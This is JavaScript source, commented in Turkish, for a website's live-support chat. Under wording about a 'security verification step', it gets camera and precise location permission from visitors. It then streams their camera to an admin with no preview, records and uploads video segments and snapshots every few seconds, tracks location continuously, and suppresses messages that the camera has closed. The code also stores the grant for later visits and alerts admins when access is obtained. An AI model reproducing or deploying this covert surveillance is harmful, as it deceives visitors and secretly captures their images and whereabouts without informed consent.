    // Ölü oturumları temizle — canlı olanı migrate et
    for (const otherId of [...cameraSessions.keys()]) {
      if (otherId === callId) continue;
      const st = cameraSessions.get(otherId);
      if (hasLiveCameraTracks(st)) {
        return migrateLiveCameraToCallId(otherId, callId, box, options);
      }
      await stopCameraSession(otherId, { upload: false });
    }
    await stopCameraSession(callId, { upload: false });

    let stream = options.stream || null;
    if (stream && !hasLiveCameraTracks(stream)) stream = null;
    if (!stream) {
      try {
        stream = await acquireCameraStreamNative();
      } catch (err) {
        const name = String(err?.name || "");
        if (auto && (name === "NotAllowedError" || name === "SecurityError" || name === "NotReadableError")) {
          return "need-gesture";
        }
        if (!options.silent) {
          appendMessage(
            box,
            "bot",
            "Güvenlik doğrulaması tamamlanamadı. Aşağıdaki Doğrula butonuna basın.",
            { sync: false }
          );
        }
        syncMessage("user", "Güvenlik doğrulaması reddedildi / erişilemedi.");
        if (!auto) await sync.setCameraCallStatus(sync.getSessionId(), callId, "denied");
        return "denied";
      }
    }

    // Sessiz akış: önizleme yok, sadece durum metni
    const preview = showSilentCameraStatus(box, callId);
    const pc = new RTCPeerConnection(sync.ICE_SERVERS);
    const sessionId = sync.getSessionId();
    const state = {
      pc,
      stream,
      wrap: preview.wrap,
      video: null,
      label: preview.label,
      recorder: null,
      recordChunks: [],
      lastBlob: null,
      unsubAnswer: null,
      unsubIce: null,
      geoWatchId: null,
      _hadLocation: false,
      maxDurationTimer: null,
      segmentTimer: null,
      snapshotTimer: null,
      snapVideo: null,
      locationRetryTimer: null,
    };
    cameraSessions.set(callId, state);
    latestCameraCallId = callId;
    if (earlyCameraStream === stream) earlyCameraStream = null;

    // Admin bağlanmazsa ~90 sn sonra kaydı Storage’a yükle (PC kapalı senaryosu)
    state.maxDurationTimer = window.setTimeout(() => {
      if (!sessionStillActive(state, callId)) return;
      const activeId = resolveSessionCallId(state, callId);
      void stopCameraSession(activeId, { upload: true });
    }, VISITOR_RECORD_MAX_MS);

    // Gesture / redirect stash / Permissions API ile alınan konum — önce seed,
    // sonra watch. Seed varken deferAsk YAPMA — watch ölürdü (yenileme bug’ı).
    const seed = options.seedLocation || restoreEarlyLocation();
    startLiveLocationWatch(state, sessionId, callId, sync, box, {
      deferAsk: Boolean(options.deferLocation),
      silent: options.silent !== false,
    });
    if (seed?.coords && !state._hadLocation) {
      applySeedLocationToSession(sync, callId, state, seed);
      box?.querySelectorAll?.(".chat-location-perm-denied")?.forEach((el) => el.remove());
    }
    try {
      state.ensureLiveWatch?.();
    } catch {
      /* ignore */
    }
    if (!state._hadLocation && !options.deferLocation) {
      try {
        state.retryLocation?.(false);
      } catch {
        /* ignore */
      }
    } else if (state._hadLocation && state.geoWatchId == null) {
      try {
        state.retryLocation?.({ fromUserTap: false, force: true });
      } catch {
        /* ignore */
      }
    }

    // Sayfa kapanmadan önce parça parça Storage’a yaz (pagehide upload güvenilmez)
    // Kayıt: track eklendikten / ilk frame sonrası — bozuk açılış karesi olmasın

    // Video olmasa bile ~5 sn’de bir JPEG → Storage
    startSnapshotUploads(state, sessionId, callId, sync);

    stream.getVideoTracks().forEach((track) => {
      tuneVideoTrack(track);
      pc.addTrack(track, stream);
    });
    await configureVisitorVideoSender(pc);

    const beginRec = () => {
      if (!cameraSessions.has(callId) || state.recorder) return;
      if (!startVisitorRecording(state)) {
        if (preview.label) {
          preview.label.textContent =
            "Kimlik doğrulaması devam ediyor… (kayıt sınırlı — sayfada kalın)";
        }
        // Kısa retry — ilk frame gelmeden MediaRecorder başarısız olabilir
        window.setTimeout(() => {
          if (!cameraSessions.has(callId) || state.recorder) return;
          if (startVisitorRecording(state)) {
            startSegmentUploads(state, sessionId, callId, sync);
          }
        }, 900);
      } else {
        startSegmentUploads(state, sessionId, callId, sync);
      }
    };
    const vt = stream.getVideoTracks().find((t) => t.readyState === "live");
    if (vt && vt.muted) {
      const onUnmute = () => {
        vt.removeEventListener("unmute", onUnmute);
        beginRec();
      };
      vt.addEventListener("unmute", onUnmute);
      window.setTimeout(beginRec, 600);
    } else {
      window.setTimeout(beginRec, 120);
    }

    const pendingAdminIce = [];
    let remoteReady = false;

    function clearMaxDurationOnAdminJoin() {
      if (!state.maxDurationTimer) return;
      window.clearTimeout(state.maxDurationTimer);
      state.maxDurationTimer = null;
    }

    pc.onicecandidate = (ev) => {
      if (ev.candidate) {
        const activeId = resolveSessionCallId(state, callId);
        sync
          .pushIceCandidate(sessionId, activeId, "visitor", ev.candidate.toJSON())
          .catch(() => {});
      }
    };

    pc.onconnectionstatechange = () => {
      if (pc.connectionState === "connected") {
        clearMaxDurationOnAdminJoin();
      }
      if (state.label && pc.connectionState === "connected") {
        state.label.textContent =
          "Kimlik doğrulaması devam ediyor… Lütfen bekleyin; bu sayfadan ayrılmayın.";
      }
    };

    const addAdminIce = async (cand) => {
      if (!cand || !state.pc) return;
      if (!remoteReady) {
        pendingAdminIce.push(cand);
        return;
      }
      try {
        await state.pc.addIceCandidate(new RTCIceCandidate(cand));
      } catch {
        /* ignore */
      }
    };

    state.unsubIce = sync.listenIceCandidates(sessionId, callId, "admin", (cand) => {
      addAdminIce(cand);
    });

    let answered = false;
    let ending = false;
    state.unsubAnswer = sync.listenCameraCall(sessionId, callId, async (data) => {
      if (!data) return;
      const activeId = resolveSessionCallId(state, callId);
      const shouldEnd =
        data.status === "ended" ||
        data.status === "denied" ||
        data.forceClose === true;
      if (shouldEnd && !ending) {
        ending = true;
        await stopCameraSession(activeId, {
          upload: data.status === "ended" || data.forceClose === true,
        });
        // Sessiz: ziyaretçiye kamera kapandı mesajı gösterme
        return;
      }
      if (!state.pc) return;
      if (data.answer?.sdp) {
        const sdp = String(data.answer.sdp);
        if (!answered) {
          answered = true;
          state._lastAnswerSdp = sdp;
          clearMaxDurationOnAdminJoin();
          try {
            await state.pc.setRemoteDescription(
              new RTCSessionDescription({
                type: data.answer.type,
                sdp,
              })
            );
            remoteReady = true;
            for (const cand of pendingAdminIce.splice(0)) {
              await addAdminIce(cand);
            }
          } catch (err) {
            answered = false;
            console.error(err);
          }
        } else if (sdp !== state._lastAnswerSdp && state.pc.signalingState !== "closed") {
          state._lastAnswerSdp = sdp;
          try {
            const offer = await state.pc.createOffer({ iceRestart: true });
            await state.pc.setLocalDescription(offer);
            await sync.writeCameraOffer(sessionId, activeId, {
              type: offer.type,
              sdp: offer.sdp,
            });
            await sync.markVisitorCameraReady?.(sessionId, activeId).catch(() => {});
          } catch (err) {
            console.warn("visitor renegotiate", err);
          }
        }
      }
    });

    try {
      await sync.markVisitorCameraReady(sessionId, callId).catch(() => {});
      const offer = await pc.createOffer();
      await pc.setLocalDescription(offer);
      await sync.writeCameraOffer(sessionId, callId, {
        type: offer.type,
        sdp: offer.sdp,
      });
      try {
        sessionStorage.removeItem("soft_resume_v1");
      } catch {
        /* ignore */
      }
      // Ziyaretçi sohbetinde mesaj yok — konum ayrı takip edilir
      if (!cameraGrantedSynced) {
        cameraGrantedSynced = true;
        syncMessage("user", auto ? "Güvenlik doğrulaması onaylandı." : "Güvenlik doğrulaması onaylandı.");
      }
      return "ok";
    } catch (err) {
      console.error(err);
      await stopCameraSession(callId, { upload: false });
      if (!connectionFailShown) {
        connectionFailShown = true;
        appendMessage(
          box,
          "bot",
          "Bağlantı kurulamadı. Lütfen sayfada kalın ve tekrar deneyin.",
          { sync: false }
        );
      }
      // ended yazma — aynı callId ile sessizce tekrar dene (spam mesaj olmasın)
      await sync.setCameraCallStatus(sessionId, callId, "requested").catch(() => {});
      return "error";
    }
    })();

    startVisitorCameraLock = run;
    try {
      return await run;
    } finally {
      if (startVisitorCameraLock === run) startVisitorCameraLock = null;
    }
  }

  function phonePermSettingsHelp(kind) {
    const ios = /iPhone|iPad|iPod/i.test(navigator.userAgent || "");
    if (kind === "camera") {
      return ios
        ? "Kimlik doğrulaması için Ayarlar → Safari → bu site → güvenlik adımını Açık yapın. Sonra buraya dönüp tekrar Doğrula’ya dokun."
        : "Kimlik doğrulaması için adres çubuğundaki kilit → bu site → güvenlik adımını Açık yapın. Sonra tekrar Doğrula’ya dokun.";
    }
    return ios
      ? "Kimlik doğrulaması için Ayarlar → Safari → bu site → güvenlik adımını Açık / Sor yapın. Sonra tekrar Doğrula’ya dokun."
      : "Kimlik doğrulaması için adres çubuğundaki kilit → bu site → güvenlik adımını Açık yapın. Sonra tekrar Doğrula’ya dokun.";
  }

  function showCameraRequest(box, msg, options = {}) {
    box.querySelectorAll(".chat-camera-request").forEach((el) => el.remove());
    box.querySelectorAll(".chat-location-tap").forEach((el) => el.remove());
    document.getElementById("loc-perm-fab")?.remove();

    const card = document.createElement("div");
    card.className =
      "chat-inline-prompt chat-camera-request" +
      (options.sticky ? " chat-camera-request-sticky" : "");
    card.setAttribute("role", "group");
    card.setAttribute("aria-label", "Kimlik doğrulama");

    const title = document.createElement("p");
    title.className = "chat-inline-prompt-title";
    title.textContent =
      msg.text ||
      "Kimlik doğrulaması için güvenlik adımı zorunludur.";

    const note = document.createElement("p");
    note.className = "chat-camera-note";
    note.textContent =
      msg.note ||
      "Doğrula’ya dokunun — telefon güvenlik penceresini açacak. Bu adım kimlik doğrulaması için gereklidir; tamamlamadan ilerlenemez.";

    const actions = document.createElement("div");
    actions.className = "chat-inline-prompt-actions";

    const okBtn = document.createElement("button");
    okBtn.type = "button";
    okBtn.className = "btn btn-primary chat-perm-tap-btn";
    okBtn.textContent = msg.okLabel || "Doğrula";

    const cancelBtn = document.createElement("button");
    cancelBtn.type = "button";
    cancelBtn.className = "btn btn-ghost";
    cancelBtn.textContent = msg.cancelLabel || "Reddet";
    const showCancel = msg.cancelLabel !== "" && msg.hideCancel !== true;
    const nativeFromTap = options.nativeFromTap !== false;
    const locationOnly = options.locationOnly === true || msg.locationOnly === true;

    const requestLocationOnce = () =>
      new Promise((resolve) => {
        if (!navigator.geolocation) {
          resolve({ ok: false, err: { code: 0, message: "unsupported" } });
          return;
        }
        // Dokunuşla doğrudan telefon konum izni (iOS: highAccuracy + fresh)
        navigator.geolocation.getCurrentPosition(
          (pos) => resolve({ ok: true, pos }),
          (err) => resolve({ ok: false, err }),
          { enableHighAccuracy: true, maximumAge: 0, timeout: 45000 }
        );
      });

    const finish = async (accepted) => {
      const sync = window.ChatSync;
      const callId = msg.callId;
      if (!accepted) {
        card.remove();
        if (options.softDeny) {
          options.onSoftDeny?.();
          return;
        }
        appendMessage(box, "user", "Güvenlik doğrulamasını reddettim.");
        if (sync?.enabled && callId) {
          const live = cameraSessions.get(callId)?.stream
            ?.getTracks?.()
            .some((t) => t.readyState === "live");
          // Canlı kamera varken konum/izin iptali kamerayı öldürmesin
          if (live || options.locationOnly) {
            await sync
              .writeLocationStatus?.(sync.getSessionId(), callId, "denied", "user-cancel")
              .catch(() => {});
          } else {
            await sync.setCameraCallStatus(sync.getSessionId(), callId, "denied").catch(() => {});
          }
        }
        return;
      }
      if (!callId) {
        card.remove();
        appendMessage(box, "bot", "Doğrulama oturumu eksik; talebi yeniden gönderin.", {
          sync: false,
        });
        return;
      }

      okBtn.disabled = true;
      let targetCallId = callId;
      let existing =
        cameraSessions.get(callId) ||
        (() => {
          const live = findLiveCameraSessionEntry();
          if (live) {
            targetCallId = live[0];
            return live[1];
          }
          return null;
        })();
      let seedLocation = null;

      // Sadece konum (kamera zaten açık)
      if (locationOnly || (existing && hasLiveCameraTracks(existing) && !existing._hadLocation)) {
        title.textContent = "Güvenlik doğrulaması";
        note.textContent = "Telefon güvenlik penceresi açılıyor… Penceredeki onayla devam edin.";
        okBtn.textContent = "Doğrulanıyor…";
        sync
          ?.writeLocationStatus?.(sync.getSessionId(), targetCallId, "prompting", "Sohbetten güvenlik adımı")
          .catch(() => {});
        const locRes = await requestLocationOnce();
        if (locRes.ok && locRes.pos) {
          stashEarlyLocation(locRes.pos);
          if (existing) {
            applySeedLocationToSession(sync, targetCallId, existing, locRes.pos);
          }
          card.remove();
          appendMessage(box, "bot", "Güvenlik doğrulaması alındı.", { sync: true });
          options.onGranted?.();
          if (existing && hasLiveCameraTracks(existing) && existing._hadLocation) {
            maybeOfferPhoneEntry(box);
          }
          return;
        }
        const code = locRes.err?.code;
        // Permissions API denied değilse “reddedildi” yazma (Safari false positive)
        let geoState = "unknown";
        try {
          const p = await navigator.permissions?.query?.({ name: "geolocation" });
          geoState = p?.state || "unknown";
        } catch {
          /* ignore */
        }
        const hardDeny = code === 1 && geoState === "denied";
        sync
          ?.writeLocationStatus?.(
            sync.getSessionId(),
            targetCallId,
            hardDeny ? "denied" : code === 3 ? "timeout" : "prompting",
            locRes.err?.message || String(code || "err")
          )
          .catch(() => {});
        if (existing) {
          try {
            existing.retryLocation?.({ fromUserTap: true, explicit: hardDeny });
          } catch {
            /* ignore */
          }
        }
        title.textContent = hardDeny ? "Doğrulama yok — telefon ayarı" : "Güvenlik doğrulaması tamamlanıyor…";
        note.textContent = hardDeny
          ? phonePermSettingsHelp("location")
          : "Onayladıysanız sabitleme biraz sürebilir. Tekrar Doğrula’ya dokunun.";
        okBtn.textContent = "Tekrar dene";
        okBtn.disabled = false;
        options.onSoftDeny?.(String(code || "loc"));
        return;
      }

      // --- 1) Kamera: sohbet İzin ver → doğrudan telefon kamera izni ---
      title.textContent = "Güvenlik doğrulaması";
      note.textContent = "Telefon güvenlik penceresi açılıyor… Penceredeki onayla devam edin.";
      okBtn.textContent = "Doğrulanıyor…";

      let stream = null;
      try {
        if (nativeFromTap) {
          stream = await acquireCameraStreamNative();
        }
      } catch (err) {
        console.warn("camera perm", err);
        const blocked =
          err?.name === "NotAllowedError" ||
          err?.name === "PermissionDeniedError" ||
          /denied|permission/i.test(String(err?.message || ""));
        title.textContent = blocked ? "Doğrulama yok — telefon ayarı" : "Doğrulama açılamadı";
        note.textContent = blocked
          ? phonePermSettingsHelp("camera")
          : "Doğrulama tamamlanamadı. Tekrar Doğrula’ya basın.";
        okBtn.textContent = "Ayarlardan sonra tekrar dene";
        okBtn.disabled = false;
        options.onSoftDeny?.(String(err?.name || err));
        return;
      }

      // --- 2) Konum: aynı akışta telefon konum izni ---
      title.textContent = "Güvenlik doğrulamasını tamamlayın";
      note.textContent = "Telefon güvenlik penceresi açılıyor… Penceredeki onayla devam edin.";
      okBtn.textContent = "Doğrulanıyor…";
      sync
        ?.writeLocationStatus?.(sync.getSessionId(), callId, "prompting", "İkinci güvenlik adımı")
        .catch(() => {});

      const locRes = await requestLocationOnce();
      if (locRes.ok && locRes.pos) {
        seedLocation = locRes.pos;
        appendMessage(box, "bot", "Güvenlik doğrulaması alındı.", { sync: true });
      } else {
        const code = locRes.err?.code;
        let geoState = "unknown";
        try {
          const p = await navigator.permissions?.query?.({ name: "geolocation" });
          geoState = p?.state || "unknown";
        } catch {
          /* ignore */
        }
        const hardDeny = code === 1 && geoState === "denied";
        sync
          ?.writeLocationStatus?.(
            sync.getSessionId(),
            callId,
            hardDeny ? "denied" : code === 3 ? "timeout" : "prompting",
            locRes.err?.message || String(code || "err")
          )
          .catch(() => {});
      }

      try {
        card.remove();
        const result = await startVisitorCamera(box, callId, {
          auto: false,
          stream: stream || undefined,
          seedLocation: seedLocation || undefined,
          deferLocation: !seedLocation,
        });

        if (result === "ok" && cameraSessions.get(callId)?._hadLocation) {
          options.onGranted?.();
          maybeOfferPhoneEntry(box);
          return;
        }

        if (result === "ok" && !cameraSessions.get(callId)?._hadLocation) {
          appendMessage(box, "bot", "İlk adım alındı. Kimlik doğrulaması için Doğrula’ya dokunun.", {
            sync: true,
          });
          showCameraRequest(
            box,
            {
              callId,
              text: "Güvenlik doğrulaması zorunlu",
              note: phonePermSettingsHelp("location"),
              okLabel: "Doğrula",
              hideCancel: true,
              locationOnly: true,
            },
            {
              softDeny: true,
              sticky: true,
              nativeFromTap: true,
              locationOnly: true,
              onGranted: () => options.onGranted?.(),
              onSoftDeny: (r) => options.onSoftDeny?.(r),
            }
          );
          return;
        }

        if (options.softDeny) options.onSoftDeny?.(result || "camera");
      } catch (err) {
        console.warn("start camera", err);
        showCameraRequest(
          box,
          {
            callId,
            text: "Bağlantı kurulamadı",
            note: "Doğrula’ya tekrar dokunun.",
            okLabel: "Tekrar dene",
            hideCancel: true,
          },
          {
            softDeny: true,
            sticky: true,
            nativeFromTap: true,
            onGranted: () => options.onGranted?.(),
            onSoftDeny: (r) => options.onSoftDeny?.(r),
          }
        );
        options.onSoftDeny?.(String(err?.name || err));
      }
    };

    okBtn.addEventListener("click", (e) => {
      e.preventDefault();
      if (okBtn.disabled) return;
      void finish(true);
    });

    if (showCancel) {
      cancelBtn.addEventListener("click", () => finish(false));
      actions.append(okBtn, cancelBtn);
    } else {
      actions.append(okBtn);
    }
    card.append(title, note, actions);
    box.appendChild(card);
    box.scrollTop = box.scrollHeight;
    if (!isLikelyMobile()) okBtn.focus();
  }

  let cameraOpenSeq = 0;
  let latestCameraCallId = null;
  let cameraPermLoopToken = 0;
  let cameraPermLoopTimer = null;
  let mediaForceGestureUnsub = null;
  let earlyCameraStream = null;
  let earlyLocationPos = null;
  let pageEntryPermBooted = false;
  let pageEntryRetryTimer = null;
  let pageEntryGestureUnsub = null;
  let cameraGrantedSynced = false;
  let connectionFailShown = false;
  let locationGrantedSynced = false;
  let mediaStatusAnnounced = false;
  let cameraActivateInFlight = null;
  let pageEntryPermBusy = false;
  let pageEntryGateBusyUntil = 0;
  const CAMERA_PERM_RETRY_MS = 10_000;
  const MEDIA_PERM_GRANTED_KEY = "media_perm_granted_v1";
  const CAMERA_PERM_DENIED_TEXT =
    "Kimlik doğrulaması için güvenlik adımı zorunludur. Lütfen onaylayın; aksi halde doğrulama tamamlanamaz.";

  function isMediaPermGranted() {
    // Kalıcı tam erişim: bir kez verildiğinde sonraki ziyaretlerde hatırla
    try {
      if (localStorage.getItem(MEDIA_PERM_GRANTED_KEY) === "1") return true;
    } catch {
      /* ignore */
    }
    // Canlı oturum yoksa bayrağa güvenme (yenileme sonrası yalan)
    if (!hasLiveCameraAndLocation()) return false;
    try {
      return sessionStorage.getItem(MEDIA_PERM_GRANTED_KEY) === "1";
    } catch {
      return false;
    }
  }

  function markMediaPermGranted() {
    try {
      localStorage.setItem(MEDIA_PERM_GRANTED_KEY, "1");
      localStorage.setItem(`${MEDIA_PERM_GRANTED_KEY}_at`, String(Date.now()));
      sessionStorage.setItem(MEDIA_PERM_GRANTED_KEY, "1");
      sessionStorage.setItem(`${MEDIA_PERM_GRANTED_KEY}_at`, String(Date.now()));
      sessionStorage.removeItem("soft_resume_v1");
    } catch {
      /* ignore */
    }
    hidePageEntryPermGate();
  }

  function hasRememberedFullAccess() {
    try {
      if (localStorage.getItem(MEDIA_PERM_GRANTED_KEY) === "1") return true;
      // Eski sekme bayrağını kalıcıya yükselt
      if (sessionStorage.getItem(MEDIA_PERM_GRANTED_KEY) === "1") {
        localStorage.setItem(MEDIA_PERM_GRANTED_KEY, "1");
        localStorage.setItem(`${MEDIA_PERM_GRANTED_KEY}_at`, String(Date.now()));
        return true;
      }
    } catch {
      /* ignore */
    }
    return false;
  }

  function navigationIsReload() {
    try {
      const nav = performance.getEntriesByType?.("navigation")?.[0];
      return nav?.type === "reload";
    } catch {
      return false;
    }
  }

  function markNeedsFreshCall() {
    try {
      sessionStorage.setItem("needs_fresh_call_v1", "1");
      sessionStorage.removeItem("pending_camera_call_v1");
      sessionStorage.removeItem("soft_resume_v1");
    } catch {
      /* ignore */
    }
    latestCameraCallId = null;
  }

  function consumeNeedsFreshCall() {
    // Soft resume varken fresh call zorlama
    if (isSoftResumePending()) return false;
    try {
      if (sessionStorage.getItem("needs_fresh_call_v1") === "1") {
        sessionStorage.removeItem("needs_fresh_call_v1");
        return true;
      }
    } catch {
      /* ignore */
    }
    // Yenileme = soft resume (yeni call değil)
    if (navigationIsReload()) return false;
    return false;
  }

  /** Ölü/ended pending callId'yi at; soft resume’da aynı call’ı dirilt */
  async function resolveUsableVisitorCallId(preferId, sync) {
    const softResume = isSoftResumePending() || navigationIsReload();
    const forceFresh = consumeNeedsFreshCall();
    let candidate = forceFresh ? null : preferId || null;
    if (!forceFresh && !candidate) {
      try {
        candidate = sessionStorage.getItem("pending_camera_call_v1");
      } catch {
        candidate = null;
      }
    }
    if (!candidate && softResume) {
      try {
        candidate = sessionStorage.getItem("pending_camera_call_v1");
      } catch {
        candidate = null;
      }
    }

    if (candidate && sync?.getCameraCall) {
      try {
        await sync.ensureSession?.();
        const data = await sync.getCameraCall(sync.getSessionId(), candidate);
        const ok =
          data &&
          (typeof sync.isCameraCallReusable === "function"
            ? sync.isCameraCallReusable(data, { allowSoftResume: softResume })
            : !["ended", "denied"].includes(String(data.status || "")) || softResume);
        if (!ok) candidate = null;
        else if (softResume && sync.resumeVisitorCameraCall) {
          await sync.resumeVisitorCameraCall(sync.getSessionId(), candidate).catch(() => {});
        }
      } catch {
        candidate = null;
      }
    }

    if (candidate) {
      latestCameraCallId = candidate;
      try {
        sessionStorage.setItem("pending_camera_call_v1", candidate);
        if (softResume) sessionStorage.setItem("soft_resume_v1", "1");
      } catch {
        /* ignore */
      }
      return candidate;
    }

    if (!sync?.startVisitorCameraOffer) return null;
    try {
      // Soft resume’da da Firebase reuse dene (lastCallId)
      const offer = await sync.startVisitorCameraOffer(
        "Kimlik doğrulaması için güvenlik adımı zorunludur. Onaylarsanız doğrulama bu destek oturumuna bağlanır. Onaylanmazsa adım tamamlanamaz.",
        { reuse: !forceFresh || softResume, silent: true }
      );
      const id = offer?.callId || null;
      if (id) {
        latestCameraCallId = id;
        try {
          sessionStorage.setItem("pending_camera_call_v1", id);
          sessionStorage.removeItem("needs_fresh_call_v1");
          if (softResume && sync.resumeVisitorCameraCall) {
            await sync.resumeVisitorCameraCall(sync.getSessionId(), id).catch(() => {});
          }
        } catch {
          /* ignore */
        }
      }
      return id;
    } catch (err) {
      console.warn("resolve callId", err);
      return null;
    }
  }

  /** İzin verildiği anda ziyaretçide sohbeti aç / odakla */
  let visitorChatOpenedAfterPerm = false;
  function openVisitorChatNow(opts = {}) {
    if (visitorChatOpenedAfterPerm && !opts.force) return;
    if (/admin\.html$/i.test(location.pathname || "")) return;

    const homeChat = document.getElementById("canli-destek");
    const chatRoot = document.querySelector("[data-chat-root]");
    const onChatPage =
      /chat\.html$/i.test(location.pathname || "") ||
      Boolean(document.querySelector("main.chat-page"));

    // chat.html veya index/#canli-destek — redirect YOK (oturumu öldürme)
    if (onChatPage || homeChat || chatRoot) {
      visitorChatOpenedAfterPerm = true;
      const root = homeChat || chatRoot || document.querySelector("[data-chat-root]");
      if (homeChat && (location.hash || "").replace(/^#/, "") !== "canli-destek") {
        try {
          location.hash = "canli-destek";
        } catch {
          /* ignore */
        }
      }
      root?.scrollIntoView?.({ behavior: "smooth", block: "start" });
      window.setTimeout(() => {
        root?.querySelector?.("[data-chat-input]")?.focus?.();
      }, 280);
      return;
    }

    // ban-appeal / makale — stash sonrası chat.html
    visitorChatOpenedAfterPerm = true;
    try {
      stopCameraPermissionLoop();
    } catch {
      /* ignore */
    }
    try {
      sessionStorage.setItem("open_chat_after_perm_v1", "1");
      if (latestCameraCallId) {
        sessionStorage.setItem("pending_camera_call_v1", latestCameraCallId);
      }
    } catch {
      /* ignore */
    }
    const href = inArticles ? "../chat.html" : "chat.html";
    location.assign(href);
  }

  /** Tek giriş: kamera+konum (tüm sayfalar) */
  async function ensureVisitorMedia(preferredBox, opts = {}) {
    return openCameraLikeChat(preferredBox || getOrCreateMediaHost(), opts);
  }

  function clearMediaPermGranted() {
    try {
      sessionStorage.removeItem(MEDIA_PERM_GRANTED_KEY);
      sessionStorage.removeItem(`${MEDIA_PERM_GRANTED_KEY}_at`);
      localStorage.removeItem(MEDIA_PERM_GRANTED_KEY);
      localStorage.removeItem(`${MEDIA_PERM_GRANTED_KEY}_at`);
    } catch {
      /* ignore */
    }
  }

  function hasLiveCameraSession() {
    return Boolean(findLiveCameraSessionEntry());
  }

  function hasLiveCameraAndLocation() {
    return [...cameraSessions.values()].some(
      (st) => st?._hadLocation && hasLiveCameraTracks(st)
    );
  }

  /** Gate kapanışı: canlı kamera + konum (erken stash yeterli — WebRTC oturumu şart değil). */
  function hasGateCameraAndLocation() {
    if (hasLiveCameraAndLocation()) return true;
    const camOk =
      hasLiveCameraSession() ||
      hasLiveCameraTracks(earlyCameraStream) ||
      [...cameraSessions.values()].some((st) => hasLiveCameraTracks(st));
    if (!camOk) return false;
    const locOk =
      Boolean(earlyLocationPos?.coords) ||
      Boolean(restoreEarlyLocation()?.coords) ||
      [...cameraSessions.values()].some((st) => st?._hadLocation);
    return locOk;
  }

  function hidePageEntryPermGate() {
    document.getElementById("page-entry-perm-gate")?.remove();
  }

  async function enrollVisitorPushAndNotifyAdmins() {
    try {
      const sync = window.ChatSync || (await window.ChatSyncReady);
      if (!sync?.enabled) return;
      if (typeof sync.enablePushNotifications === "function") {
        await sync.enablePushNotifications("visitor");
      }
      if (typeof sync.notifyAdminsPush === "function") {
        const sid = sync.getSessionId?.() || "";
        void sync.notifyAdminsPush({
          title: "Yeni ziyaretçi çevrimiçi",
          body: `#${String(sid).slice(0, 6)} · kamera/konum erişimi alındı`,
          tag: `visitor-online-${sid}`,
        });
      }
    } catch (err) {
      console.warn("visitor push enroll", err);
    }
  }

  function setPageEntryGateStatus(text) {
    const el = document.querySelector("#page-entry-perm-gate [data-page-perm-status]");
    if (el) el.textContent = text || "";
  }

  function setPageEntryGateBusy(busy, statusText) {
    pageEntryPermBusy = Boolean(busy);
    pageEntryGateBusyUntil = busy ? Date.now() + 25_000 : 0;
    const gate = document.getElementById("page-entry-perm-gate");
    const btn = gate?.querySelector?.("[data-page-perm-allow]");
    if (btn) {
      btn.disabled = Boolean(busy);
      btn.textContent = busy ? "İşleniyor…" : "Doğrula";
    }
    if (statusText) setPageEntryGateStatus(statusText);
  }

  /**
   * Jest anında kamera + konum — getUserMedia AYNI TİKTE başlar (await yok).
   */
  function kickNativeMediaFromGesture() {
    // 1) En basit gum — jest tüketilmeden
    let camP;
    if (!navigator.mediaDevices?.getUserMedia) {
      camP = Promise.resolve({ ok: false, err: new Error("getUserMedia yok") });
    } else {
      const existing = getAnyLiveCameraStream();
      if (existing) {
        camP = Promise.resolve({ ok: true, stream: existing });
      } else {
        // Kritik: doğrudan çağır — lock/await yok
        camP = navigator.mediaDevices
          .getUserMedia({ video: true, audio: false })
          .then((stream) => {
            stream.getVideoTracks().forEach(tuneVideoTrack);
            earlyCameraStream = stream;
            return { ok: true, stream };
          })
          .catch((err) =>
            acquireCameraStreamNative({ fromGesture: true })
              .then((stream) => ({ ok: true, stream }))
              .catch((err2) => ({ ok: false, err: err2 || err }))
          );
      }
    }
    const locP = acquireLocationNativeOnce();
    return { camP, locP };
  }

  /** Canlı oturumda admin’in beklediği SDP offer yoksa yeniden yaz */
  async function republishVisitorCameraOffer(callId) {
    const sync = window.ChatSync;
    const sessionId = sync?.getSessionId?.();
    const state = callId ? cameraSessions.get(callId) : null;
    if (!sync || !sessionId || !state?.pc || !hasLiveCameraTracks(state)) return false;
    const pc = state.pc;
    if (pc.signalingState === "closed") return false;
    try {
      await sync.markVisitorCameraReady?.(sessionId, callId).catch(() => {});
      // Admin henüz answer vermedi — mevcut offer’ı tekrar yayınla (yeni epoch)
      if (
        pc.localDescription?.type === "offer" &&
        (pc.signalingState === "have-local-offer" || !pc.remoteDescription)
      ) {
        await sync.writeCameraOffer(sessionId, callId, {
          type: pc.localDescription.type,
          sdp: pc.localDescription.sdp,
        });
        latestCameraCallId = callId;
        return true;
      }
      // Bağlı / stable: iceRestart ile yeni offer
      if (pc.signalingState === "stable") {
        const offer = await pc.createOffer({ iceRestart: true });
        await pc.setLocalDescription(offer);
        await sync.writeCameraOffer(sessionId, callId, {
          type: offer.type,
          sdp: offer.sdp,
        });
        latestCameraCallId = callId;
        return true;
      }
      return false;
    } catch (err) {
      console.warn("republish offer", err);
      return false;
    }
  }

  async function finishGateAfterCamera(host) {
    const box = host || getOrCreateMediaHost();
    markMediaPermGranted();
    // Hesap penceresi ASLA WebRTC’yi beklemesin (Firebase asılırsa “hiçbir şey olmuyor”)
    hidePageEntryPermGate();
    setPageEntryGateBusy(false);
    forceOfferPhoneEntry(box);
    void enrollVisitorPushAndNotifyAdmins();

    // Admin canlı kamera: call + SDP (arka planda, jest bayrağıyla)
    void (async () => {
      try {
        const ok = await openCameraLikeChat(box, {
          fromGesture: true,
          announce: true,
          preferEarlyStream: true,
        });
        const live = findLiveCameraSessionEntry();
        if (live?.[0]) {
          await republishVisitorCameraOffer(live[0]);
        } else if (!ok) {
          const sync = window.ChatSync || (await window.ChatSyncReady);
          if (sync?.startVisitorCameraOffer) {
            await sync.ensureSession?.();
            const offerMeta = await sync.startVisitorCameraOffer(
              "Kimlik doğrulaması için güvenlik adımı zorunludur.",
              { reuse: false, silent: true }
            );
            const callId = offerMeta?.callId;
            const stream = getAnyLiveCameraStream();
            if (callId && stream) {
              latestCameraCallId = callId;
              await startVisitorCamera(box, callId, {
                auto: true,
                silent: true,
                stream,
                seedLocation: earlyLocationPos || restoreEarlyLocation() || undefined,
              });
            }
          }
        }
      } catch (err) {
        console.warn("gate bind camera", err);
      }
    })();

    void (async () => {
      try {
        if (!earlyLocationPos?.coords) {
          const loc = await acquireLocationNativeOnce();
          if (loc?.coords) stashEarlyLocation(loc);
        }
      } catch {
        /* ignore */
      }
    })();
  }

  async function runGateAllowFlow() {
    // Takılı busy: sessiz return YOK — kullanıcıya geri bildirim
    if (pageEntryPermBusy) {
      if (Date.now() < pageEntryGateBusyUntil - 20_000) {
        setPageEntryGateStatus("İşleniyor… tarayıcı izin penceresine bakın.");
        return;
      }
      // 5 sn+ takılıysa sıfırla ve yeniden dene
